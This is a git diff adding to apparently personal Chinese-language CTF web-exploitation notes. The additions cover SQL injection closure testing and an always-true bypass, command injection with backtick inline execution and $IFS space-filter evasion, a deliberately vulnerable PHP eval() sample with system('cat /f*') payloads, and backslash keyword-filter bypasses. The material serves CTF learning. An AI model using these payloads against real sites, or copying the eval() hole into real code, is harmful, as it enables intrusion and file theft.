@@ -8,6 +8,12 @@
 
 ​	?id=1' and 1=2--+ -> 判断‘是否为闭合符
 
+​	简单粗暴一点：就是直接看回显有没有报错
+
+​	找到之后还可以试试万能钥匙（以单引号为闭合符为例）
+
+​	?id = a' or true#
+
 2. 找到回显位
 
 ​	?id=-1' union select 1,2,3--+ -> 判断哪一位为回显位
@@ -242,7 +248,26 @@ shell_exec($cmd);
 
 此时可以用通配符将flag写入fuck.txt 再直接从url中读取fuck.txt即可
 
-传参：?cmd=cat /f* > fuck.txt
+传参：?cmd=cat /f* > fuck.txt、
+
+#### session绕过
+
+[CTF-Web20（涉及简单的cookie与session）_ctf session-CSDN博客](https://blog.csdn.net/weixin_39934520/article/details/108716916)
+
+
+
+#### 常见Linux命令绕过
+
+ls绕过(内联执行)
+
+ip=;cat$IFS$9`ls`
+
+ linux下，会先执行反引号下面的语句
+ 在这里会执行ls,ls的结果是“index.php flag.php”
+ 所以最后执行的语句等价于
+ cat index.php flag.php
+
+
 
 ## XXF
 
@@ -254,6 +279,50 @@ Referer:127.0.0.1
 
 遇到将字符作为语句执行 可以将该字符设置为system("cat /f*")
 
+### RCE(远程代码执行漏洞)
 
+```php
+ <?php
+error_reporting(0);
+highlight_file(__FILE__);
+if(isset($_GET['url']))
+{
+eval($_GET['url']);
+}
+?> 
+```
+
+传入url=system("ls");
+
+找到flag后再传入url=system("cat /f*");即可
+
+
+
+还可以使用反引号绕过
+
+##### 反引号绕过
+
+ip=;cat$IFS$9`ls`
+ 原理讲解：
+ linux下，会先执行反引号下面的语句
+ 在这里会执行ls,ls的结果是“index.php flag.php”
+ 所以最后执行的语句等价于
+ cat index.php flag.php
+ 右键查看页面源码即可得到flag
+
+$IFS$9可用来代替空格
+
+```
+代替空格
+< 、<>、%20(space)、%09(tab)、$IFS$9、 ${IFS}、$IFS等
+```
+
+### PUT 请求
+
+put请求需要利用burp抓包再修改
 
 #### 今天天气真好
+
+没有过滤“\”，在shell中反斜杠被当作转义符号处理，对一个字母的转义任然是他本身，故诸如“l\s”会被当作“ls”处理，从而实现绕过；
+
+在php中，被反单引号包裹的字符会被作为shell命令处理，之后利用print函数即可获得输出结果
